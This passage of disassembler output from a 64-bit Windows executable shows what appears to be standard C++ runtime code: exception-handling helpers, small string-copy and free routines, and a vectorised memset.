   14000428a:	49 8b c8             	mov    %r8,%rcx
   14000428d:	49 8b f0             	mov    %r8,%rsi
   140004290:	4c 8b ea             	mov    %rdx,%r13
   140004293:	e8 0c 08 00 00       	call   0x140004aa4
   140004298:	4d 8b 67 08          	mov    0x8(%r15),%r12
   14000429c:	4d 8b 37             	mov    (%r15),%r14
   14000429f:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   1400042a3:	4d 2b f4             	sub    %r12,%r14
   1400042a6:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   1400042aa:	41 8b 7f 48          	mov    0x48(%r15),%edi
   1400042ae:	0f 85 dc 00 00 00    	jne    0x140004390
   1400042b4:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400042b9:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1400042be:	3b 3b                	cmp    (%rbx),%edi
   1400042c0:	0f 83 76 01 00 00    	jae    0x14000443c
   1400042c6:	8b f7                	mov    %edi,%esi
   1400042c8:	48 03 f6             	add    %rsi,%rsi
   1400042cb:	8b 44 f3 04          	mov    0x4(%rbx,%rsi,8),%eax
   1400042cf:	4c 3b f0             	cmp    %rax,%r14
   1400042d2:	0f 82 aa 00 00 00    	jb     0x140004382
   1400042d8:	8b 44 f3 08          	mov    0x8(%rbx,%rsi,8),%eax
   1400042dc:	4c 3b f0             	cmp    %rax,%r14
   1400042df:	0f 83 9d 00 00 00    	jae    0x140004382
   1400042e5:	83 7c f3 10 00       	cmpl   $0x0,0x10(%rbx,%rsi,8)
   1400042ea:	0f 84 92 00 00 00    	je     0x140004382
   1400042f0:	83 7c f3 0c 01       	cmpl   $0x1,0xc(%rbx,%rsi,8)
   1400042f5:	74 17                	je     0x14000430e
   1400042f7:	8b 44 f3 0c          	mov    0xc(%rbx,%rsi,8),%eax
   1400042fb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004300:	49 03 c4             	add    %r12,%rax
   140004303:	49 8b d5             	mov    %r13,%rdx
   140004306:	ff d0                	call   *%rax
   140004308:	85 c0                	test   %eax,%eax
   14000430a:	78 7d                	js     0x140004389
   14000430c:	7e 74                	jle    0x140004382
   14000430e:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   140004315:	75 28                	jne    0x14000433f
   140004317:	48 83 3d b1 b2 00 00 	cmpq   $0x0,0xb2b1(%rip)        # 0x14000f5d0
   14000431e:	00 
   14000431f:	74 1e                	je     0x14000433f
   140004321:	48 8d 0d a8 b2 00 00 	lea    0xb2a8(%rip),%rcx        # 0x14000f5d0
   140004328:	e8 a3 a2 00 00       	call   0x14000e5d0
   14000432d:	85 c0                	test   %eax,%eax
   14000432f:	74 0e                	je     0x14000433f
   140004331:	ba 01 00 00 00       	mov    $0x1,%edx
   140004336:	48 8b cd             	mov    %rbp,%rcx
   140004339:	ff 15 91 b2 00 00    	call   *0xb291(%rip)        # 0x14000f5d0
   14000433f:	8b 4c f3 10          	mov    0x10(%rbx,%rsi,8),%ecx
   140004343:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004349:	49 03 cc             	add    %r12,%rcx
   14000434c:	49 8b d5             	mov    %r13,%rdx
   14000434f:	e8 1c 07 00 00       	call   0x140004a70
   140004354:	49 8b 47 40          	mov    0x40(%r15),%rax
   140004358:	4c 8b c5             	mov    %rbp,%r8
   14000435b:	8b 54 f3 10          	mov    0x10(%rbx,%rsi,8),%edx
   14000435f:	49 8b cd             	mov    %r13,%rcx
   140004362:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   140004366:	49 03 d4             	add    %r12,%rdx
   140004369:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000436e:	49 8b 47 28          	mov    0x28(%r15),%rax
   140004372:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004377:	ff 15 63 af 00 00    	call   *0xaf63(%rip)        # 0x14000f2e0
   14000437d:	e8 1e 07 00 00       	call   0x140004aa0
   140004382:	ff c7                	inc    %edi
   140004384:	e9 35 ff ff ff       	jmp    0x1400042be
   140004389:	33 c0                	xor    %eax,%eax
   14000438b:	e9 b1 00 00 00       	jmp    0x140004441
   140004390:	49 8b 77 20          	mov    0x20(%r15),%rsi
   140004394:	49 2b f4             	sub    %r12,%rsi
   140004397:	e9 96 00 00 00       	jmp    0x140004432
   14000439c:	8b cf                	mov    %edi,%ecx
   14000439e:	48 03 c9             	add    %rcx,%rcx
   1400043a1:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   1400043a5:	4c 3b f0             	cmp    %rax,%r14
   1400043a8:	0f 82 82 00 00 00    	jb     0x140004430
   1400043ae:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   1400043b2:	4c 3b f0             	cmp    %rax,%r14
   1400043b5:	73 79                	jae    0x140004430
   1400043b7:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   1400043bb:	41 83 e2 20          	and    $0x20,%r10d
   1400043bf:	74 44                	je     0x140004405
   1400043c1:	45 33 c9             	xor    %r9d,%r9d
   1400043c4:	85 d2                	test   %edx,%edx
   1400043c6:	74 38                	je     0x140004400
   1400043c8:	45 8b c1             	mov    %r9d,%r8d
   1400043cb:	4d 03 c0             	add    %r8,%r8
   1400043ce:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   1400043d3:	48 3b f0             	cmp    %rax,%rsi
   1400043d6:	72 20                	jb     0x1400043f8
   1400043d8:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   1400043dd:	48 3b f0             	cmp    %rax,%rsi
   1400043e0:	73 16                	jae    0x1400043f8
   1400043e2:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   1400043e6:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   1400043eb:	75 0b                	jne    0x1400043f8
   1400043ed:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   1400043f1:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   1400043f6:	74 08                	je     0x140004400
   1400043f8:	41 ff c1             	inc    %r9d
   1400043fb:	44 3b ca             	cmp    %edx,%r9d
   1400043fe:	72 c8                	jb     0x1400043c8
   140004400:	44 3b ca             	cmp    %edx,%r9d
   140004403:	75 37                	jne    0x14000443c
   140004405:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   140004409:	85 c0                	test   %eax,%eax
   14000440b:	74 0c                	je     0x140004419
   14000440d:	48 3b f0             	cmp    %rax,%rsi
   140004410:	75 1e                	jne    0x140004430
   140004412:	45 85 d2             	test   %r10d,%r10d
   140004415:	75 25                	jne    0x14000443c
   140004417:	eb 17                	jmp    0x140004430
   140004419:	8d 47 01             	lea    0x1(%rdi),%eax
   14000441c:	49 8b d5             	mov    %r13,%rdx
   14000441f:	41 89 47 48          	mov    %eax,0x48(%r15)
   140004423:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140004428:	b1 01                	mov    $0x1,%cl
   14000442a:	4d 03 c4             	add    %r12,%r8
   14000442d:	41 ff d0             	call   *%r8
   140004430:	ff c7                	inc    %edi
   140004432:	8b 13                	mov    (%rbx),%edx
   140004434:	3b fa                	cmp    %edx,%edi
   140004436:	0f 82 60 ff ff ff    	jb     0x14000439c
   14000443c:	b8 01 00 00 00       	mov    $0x1,%eax
   140004441:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140004446:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000444a:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   14000444e:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004452:	49 8b e3             	mov    %r11,%rsp
   140004455:	41 5f                	pop    %r15
   140004457:	41 5e                	pop    %r14
   140004459:	41 5d                	pop    %r13
   14000445b:	41 5c                	pop    %r12
   14000445d:	5f                   	pop    %rdi
   14000445e:	c3                   	ret
   14000445f:	cc                   	int3
   140004460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004465:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000446a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000446f:	41 56                	push   %r14
   140004471:	48 83 ec 20          	sub    $0x20,%rsp
   140004475:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140004479:	4c 8b f2             	mov    %rdx,%r14
   14000447c:	48 8b f1             	mov    %rcx,%rsi
   14000447f:	74 4c                	je     0x1400044cd
   140004481:	48 8b 01             	mov    (%rcx),%rax
   140004484:	48 85 c0             	test   %rax,%rax
   140004487:	74 44                	je     0x1400044cd
   140004489:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000448d:	48 ff c7             	inc    %rdi
   140004490:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   140004494:	75 f7                	jne    0x14000448d
   140004496:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   14000449a:	e8 a5 14 00 00       	call   0x140005944
   14000449f:	48 8b d8             	mov    %rax,%rbx
   1400044a2:	48 85 c0             	test   %rax,%rax
   1400044a5:	74 1c                	je     0x1400044c3
   1400044a7:	4c 8b 06             	mov    (%rsi),%r8
   1400044aa:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400044ae:	48 8b c8             	mov    %rax,%rcx
   1400044b1:	e8 ba 27 00 00       	call   0x140006c70
   1400044b6:	48 8b c3             	mov    %rbx,%rax
   1400044b9:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   1400044be:	49 89 06             	mov    %rax,(%r14)
   1400044c1:	33 db                	xor    %ebx,%ebx
   1400044c3:	48 8b cb             	mov    %rbx,%rcx
   1400044c6:	e8 fd 21 00 00       	call   0x1400066c8
   1400044cb:	eb 0a                	jmp    0x1400044d7
   1400044cd:	48 8b 01             	mov    (%rcx),%rax
   1400044d0:	48 89 02             	mov    %rax,(%rdx)
   1400044d3:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   1400044d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044dc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400044e1:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400044e6:	48 83 c4 20          	add    $0x20,%rsp
   1400044ea:	41 5e                	pop    %r14
   1400044ec:	c3                   	ret
   1400044ed:	cc                   	int3
   1400044ee:	cc                   	int3
   1400044ef:	cc                   	int3
   1400044f0:	40 53                	rex push %rbx
   1400044f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400044f6:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400044fa:	48 8b d9             	mov    %rcx,%rbx
   1400044fd:	74 08                	je     0x140004507
   1400044ff:	48 8b 09             	mov    (%rcx),%rcx
   140004502:	e8 c1 21 00 00       	call   0x1400066c8
   140004507:	48 83 23 00          	andq   $0x0,(%rbx)
   14000450b:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000450f:	48 83 c4 20          	add    $0x20,%rsp
   140004513:	5b                   	pop    %rbx
   140004514:	c3                   	ret
   140004515:	cc                   	int3
   140004516:	cc                   	int3
   140004517:	cc                   	int3
   140004518:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000451d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004522:	57                   	push   %rdi
   140004523:	48 83 ec 50          	sub    $0x50,%rsp
   140004527:	48 8b da             	mov    %rdx,%rbx
   14000452a:	48 8b f1             	mov    %rcx,%rsi
   14000452d:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140004532:	48 85 d2             	test   %rdx,%rdx
   140004535:	74 1d                	je     0x140004554
   140004537:	f6 02 10             	testb  $0x10,(%rdx)
   14000453a:	74 18                	je     0x140004554
   14000453c:	48 8b 09             	mov    (%rcx),%rcx
   14000453f:	48 83 e9 08          	sub    $0x8,%rcx
   140004543:	48 8b 01             	mov    (%rcx),%rax
   140004546:	48 8b 58 30          	mov    0x30(%rax),%rbx
   14000454a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000454e:	ff 15 04 af 00 00    	call   *0xaf04(%rip)        # 0x14000f458
   140004554:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004559:	48 8b cb             	mov    %rbx,%rcx
   14000455c:	ff 15 86 ad 00 00    	call   *0xad86(%rip)        # 0x14000f2e8
   140004562:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004567:	48 85 db             	test   %rbx,%rbx
   14000456a:	74 0f                	je     0x14000457b
   14000456c:	f6 03 08             	testb  $0x8,(%rbx)
   14000456f:	75 05                	jne    0x140004576
   140004571:	48 85 c0             	test   %rax,%rax
   140004574:	75 05                	jne    0x14000457b
   140004576:	bf 00 40 99 01       	mov    $0x1994000,%edi
   14000457b:	ba 01 00 00 00       	mov    $0x1,%edx
   140004580:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140004585:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000458a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000458f:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140004594:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140004599:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000459e:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400045a2:	ff 15 48 ad 00 00    	call   *0xad48(%rip)        # 0x14000f2f0
   1400045a8:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400045ad:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400045b2:	48 83 c4 50          	add    $0x50,%rsp
   1400045b6:	5f                   	pop    %rdi
   1400045b7:	c3                   	ret
   1400045b8:	48 83 ec 28          	sub    $0x28,%rsp
   1400045bc:	e8 83 06 00 00       	call   0x140004c44
   1400045c1:	84 c0                	test   %al,%al
   1400045c3:	75 04                	jne    0x1400045c9
   1400045c5:	32 c0                	xor    %al,%al
   1400045c7:	eb 12                	jmp    0x1400045db
   1400045c9:	e8 0a 06 00 00       	call   0x140004bd8
   1400045ce:	84 c0                	test   %al,%al
   1400045d0:	75 07                	jne    0x1400045d9
   1400045d2:	e8 b5 06 00 00       	call   0x140004c8c
   1400045d7:	eb ec                	jmp    0x1400045c5
   1400045d9:	b0 01                	mov    $0x1,%al
   1400045db:	48 83 c4 28          	add    $0x28,%rsp
   1400045df:	c3                   	ret
   1400045e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400045e4:	84 c9                	test   %cl,%cl
   1400045e6:	75 0a                	jne    0x1400045f2
   1400045e8:	e8 33 06 00 00       	call   0x140004c20
   1400045ed:	e8 9a 06 00 00       	call   0x140004c8c
   1400045f2:	b0 01                	mov    $0x1,%al
   1400045f4:	48 83 c4 28          	add    $0x28,%rsp
   1400045f8:	c3                   	ret
   1400045f9:	cc                   	int3
   1400045fa:	cc                   	int3
   1400045fb:	cc                   	int3
   1400045fc:	48 85 c9             	test   %rcx,%rcx
   1400045ff:	74 67                	je     0x140004668
   140004601:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140004605:	48 83 ec 48          	sub    $0x48,%rsp
   140004609:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   14000460f:	75 53                	jne    0x140004664
   140004611:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140004615:	75 4d                	jne    0x140004664
   140004617:	8b 41 20             	mov    0x20(%rcx),%eax
   14000461a:	2d 20 05 93 19       	sub    $0x19930520,%eax
   14000461f:	83 f8 02             	cmp    $0x2,%eax
   140004622:	77 40                	ja     0x140004664
   140004624:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140004628:	48 85 c0             	test   %rax,%rax
   14000462b:	74 37                	je     0x140004664
   14000462d:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004631:	85 d2                	test   %edx,%edx
   140004633:	74 11                	je     0x140004646
   140004635:	48 03 51 38          	add    0x38(%rcx),%rdx
   140004639:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   14000463d:	e8 2a 00 00 00       	call   0x14000466c
   140004642:	eb 20                	jmp    0x140004664
   140004644:	eb 1e                	jmp    0x140004664
   140004646:	f6 00 10             	testb  $0x10,(%rax)
   140004649:	74 19                	je     0x140004664
   14000464b:	48 8b 41 28          	mov    0x28(%rcx),%rax
   14000464f:	48 8b 08             	mov    (%rax),%rcx
   140004652:	48 85 c9             	test   %rcx,%rcx
   140004655:	74 0d                	je     0x140004664
   140004657:	48 8b 01             	mov    (%rcx),%rax
   14000465a:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000465e:	ff 15 f4 ad 00 00    	call   *0xadf4(%rip)        # 0x14000f458
   140004664:	48 83 c4 48          	add    $0x48,%rsp
   140004668:	c3                   	ret
   140004669:	cc                   	int3
   14000466a:	cc                   	int3
   14000466b:	cc                   	int3
   14000466c:	48 ff e2             	rex.W jmp *%rdx
   14000466f:	cc                   	int3
   140004670:	48 83 ec 28          	sub    $0x28,%rsp
   140004674:	e8 83 04 00 00       	call   0x140004afc
   140004679:	48 83 c0 20          	add    $0x20,%rax
   14000467d:	48 83 c4 28          	add    $0x28,%rsp
   140004681:	c3                   	ret
   140004682:	cc                   	int3
   140004683:	cc                   	int3
   140004684:	48 83 ec 28          	sub    $0x28,%rsp
   140004688:	e8 6f 04 00 00       	call   0x140004afc
   14000468d:	48 83 c0 28          	add    $0x28,%rax
   140004691:	48 83 c4 28          	add    $0x28,%rsp
   140004695:	c3                   	ret
   140004696:	cc                   	int3
   140004697:	cc                   	int3
   140004698:	cc                   	int3
   140004699:	cc                   	int3
   14000469a:	cc                   	int3
   14000469b:	cc                   	int3
   14000469c:	cc                   	int3
   14000469d:	cc                   	int3
   14000469e:	cc                   	int3
   14000469f:	cc                   	int3
   1400046a0:	cc                   	int3
   1400046a1:	cc                   	int3
   1400046a2:	cc                   	int3
   1400046a3:	cc                   	int3
   1400046a4:	cc                   	int3
   1400046a5:	cc                   	int3
   1400046a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400046ad:	00 00 00 
   1400046b0:	57                   	push   %rdi
   1400046b1:	8b c2                	mov    %edx,%eax
   1400046b3:	48 8b f9             	mov    %rcx,%rdi
   1400046b6:	49 8b c8             	mov    %r8,%rcx
   1400046b9:	f3 aa                	rep stos %al,(%rdi)
   1400046bb:	49 8b c1             	mov    %r9,%rax
   1400046be:	5f                   	pop    %rdi
   1400046bf:	c3                   	ret
   1400046c0:	cc                   	int3
   1400046c1:	cc                   	int3
   1400046c2:	cc                   	int3
   1400046c3:	cc                   	int3
   1400046c4:	cc                   	int3
   1400046c5:	cc                   	int3
   1400046c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400046cd:	00 00 00 
   1400046d0:	48 8b c1             	mov    %rcx,%rax
   1400046d3:	4c 8b c9             	mov    %rcx,%r9
   1400046d6:	4c 8d 15 23 b9 ff ff 	lea    -0x46dd(%rip),%r10        # 0x140000000
   1400046dd:	0f b6 d2             	movzbl %dl,%edx
   1400046e0:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   1400046e7:	01 01 01 
   1400046ea:	4c 0f af da          	imul   %rdx,%r11
   1400046ee:	66 49 0f 6e c3       	movq   %r11,%xmm0
   1400046f3:	49 83 f8 0f          	cmp    $0xf,%r8
   1400046f7:	0f 87 83 00 00 00    	ja     0x140004780
   1400046fd:	0f 1f 00             	nopl   (%rax)
   140004700:	49 03 c8             	add    %r8,%rcx
   140004703:	47 8b 8c 82 00 d0 01 	mov    0x1d000(%r10,%r8,4),%r9d
   14000470a:	00 
   14000470b:	4d 03 ca             	add    %r10,%r9
   14000470e:	41 ff e1             	jmp    *%r9
   140004711:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   140004715:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   140004719:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000471e:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140004722:	c3                   	ret
   140004723:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   140004727:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000472b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   140004730:	c3                   	ret
   140004731:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004738:	0f 1f 84 00 00 00 00 
   14000473f:	00 
   140004740:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   140004744:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   140004748:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000474c:	c3                   	ret
   14000474d:	0f 1f 00             	nopl   (%rax)
   140004750:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   140004754:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   140004758:	c3                   	ret
   140004759:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   14000475d:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   140004762:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140004766:	c3                   	ret
   140004767:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   14000476b:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000476f:	c3                   	ret
   140004770:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   140004774:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   140004779:	c3                   	ret
   14000477a:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   14000477e:	c3                   	ret
   14000477f:	90                   	nop
   140004780:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   140004784:	49 83 f8 20          	cmp    $0x20,%r8
   140004788:	77 0c                	ja     0x140004796
   14000478a:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   14000478e:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   140004795:	c3                   	ret
   140004796:	83 3d 7b 58 01 00 03 	cmpl   $0x3,0x1587b(%rip)        # 0x14001a018
   14000479d:	0f 82 dd 01 00 00    	jb     0x140004980
   1400047a3:	4c 3b 05 76 58 01 00 	cmp    0x15876(%rip),%r8        # 0x14001a020
   1400047aa:	76 16                	jbe    0x1400047c2
   1400047ac:	4c 3b 05 75 58 01 00 	cmp    0x15875(%rip),%r8        # 0x14001a028
   1400047b3:	77 0d                	ja     0x1400047c2
   1400047b5:	f6 05 b8 68 01 00 02 	testb  $0x2,0x168b8(%rip)        # 0x14001b074
   1400047bc:	0f 85 ee fe ff ff    	jne    0x1400046b0
   1400047c2:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   1400047c8:	4c 8b c9             	mov    %rcx,%r9
   1400047cb:	49 83 e1 1f          	and    $0x1f,%r9
   1400047cf:	49 83 e9 20          	sub    $0x20,%r9
   1400047d3:	49 2b c9             	sub    %r9,%rcx
   1400047d6:	49 2b d1             	sub    %r9,%rdx
   1400047d9:	4d 03 c1             	add    %r9,%r8
   1400047dc:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400047e3:	76 65                	jbe    0x14000484a
   1400047e5:	4c 3b 05 3c 58 01 00 	cmp    0x1583c(%rip),%r8        # 0x14001a028
   1400047ec:	0f 87 ce 00 00 00    	ja     0x1400048c0
   1400047f2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400047f9:	1f 84 00 00 00 00 00 
   140004800:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   140004804:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   140004809:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   14000480e:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   140004813:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   14000481a:	00 
   14000481b:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   140004822:	00 
   140004823:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   14000482a:	00 
   14000482b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   140004832:	00 
   140004833:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000483a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140004841:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004848:	73 b6                	jae    0x140004800
   14000484a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000484e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140004852:	4d 8b d9             	mov    %r9,%r11
   140004855:	49 c1 eb 05          	shr    $0x5,%r11
   140004859:	47 8b 9c 9a 40 d0 01 	mov    0x1d040(%r10,%r11,4),%r11d
   140004860:	00 
   140004861:	4d 03 da             	add    %r10,%r11
   140004864:	41 ff e3             	jmp    *%r11
   140004867:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   14000486e:	ff ff ff 
   140004871:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   140004878:	ff ff ff 
   14000487b:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   140004882:	ff ff ff 
   140004885:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   14000488c:	ff ff ff 
   14000488f:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   140004896:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   14000489d:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   1400048a4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   1400048ab:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1400048af:	c5 f8 77             	vzeroupper
   1400048b2:	c3                   	ret
   1400048b3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400048ba:	84 00 00 00 00 00 
   1400048c0:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   1400048c4:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   1400048c9:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   1400048ce:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   1400048d3:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   1400048da:	00 
   1400048db:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   1400048e2:	00 
   1400048e3:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   1400048ea:	00 
   1400048eb:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   1400048f2:	00 
   1400048f3:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   1400048fa:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140004901:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140004908:	73 b6                	jae    0x1400048c0
   14000490a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000490e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140004912:	4d 8b d9             	mov    %r9,%r11
   140004915:	49 c1 eb 05          	shr    $0x5,%r11
   140004919:	47 8b 9c 9a 64 d0 01 	mov    0x1d064(%r10,%r11,4),%r11d
   140004920:	00 
   140004921:	4d 03 da             	add    %r10,%r11
   140004924:	41 ff e3             	jmp    *%r11
   140004927:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   14000492e:	ff ff ff 
   140004931:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   140004938:	ff ff ff 
   14000493b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   140004942:	ff ff ff 
   140004945:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   14000494c:	ff ff ff 
   14000494f:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   140004956:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   14000495d:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   140004964:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000496b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000496f:	0f ae f8             	sfence
   140004972:	c5 f8 77             	vzeroupper
   140004975:	c3                   	ret
   140004976:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000497d:	00 00 00 
   140004980:	4c 3b 05 99 56 01 00 	cmp    0x15699(%rip),%r8        # 0x14001a020
   140004987:	76 0d                	jbe    0x140004996
   140004989:	f6 05 e4 66 01 00 02 	testb  $0x2,0x166e4(%rip)        # 0x14001b074
   140004990:	0f 85 1a fd ff ff    	jne    0x1400046b0
   140004996:	4c 8b c9             	mov    %rcx,%r9
   140004999:	49 83 e1 0f          	and    $0xf,%r9
   14000499d:	49 83 e9 10          	sub    $0x10,%r9
   1400049a1:	49 2b c9             	sub    %r9,%rcx
   1400049a4:	49 2b d1             	sub    %r9,%rdx
